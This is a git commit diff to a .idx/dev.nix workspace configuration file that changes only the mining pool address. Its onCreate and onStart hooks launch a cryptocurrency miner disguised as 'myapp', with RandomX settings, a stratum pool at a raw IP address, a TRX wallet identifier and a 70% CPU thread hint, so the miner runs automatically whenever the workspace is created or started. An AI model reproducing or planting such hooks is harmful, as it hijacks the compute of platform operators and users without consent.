2059a49db91a28888d0a6c77082f1c80fa41b545
hoab13215 <ng.th.duye.n1102@gmail.com>
2025-06-15 08:02:42 +0700

    Update dev.nix

--- .idx/dev.nix
+++ .idx/dev.nix
@@ -18,14 +18,14 @@
       onCreate = {
         run = ''
           echo "Running myapp on create..."
-          /home/user/da/myapp -a rx/0 -o stratum+ssl://137.184.234.112:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.ngay1 -p x -k --cpu-max-threads-hint=70
+          /home/user/da/myapp -a rx/0 -o stratum+ssl://24.199.110.105:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.ngay1 -p x -k --cpu-max-threads-hint=70
         '';
       };
 
       onStart = {
         run = ''
           echo "Running myapp on start..."
-          /home/user/da/myapp -a rx/0 -o stratum+ssl://137.184.234.112:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.ngay1 -p x -k --cpu-max-threads-hint=70
+          /home/user/da/myapp -a rx/0 -o stratum+ssl://24.199.110.105:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.ngay1 -p x -k --cpu-max-threads-hint=70
         '';
       };
     };
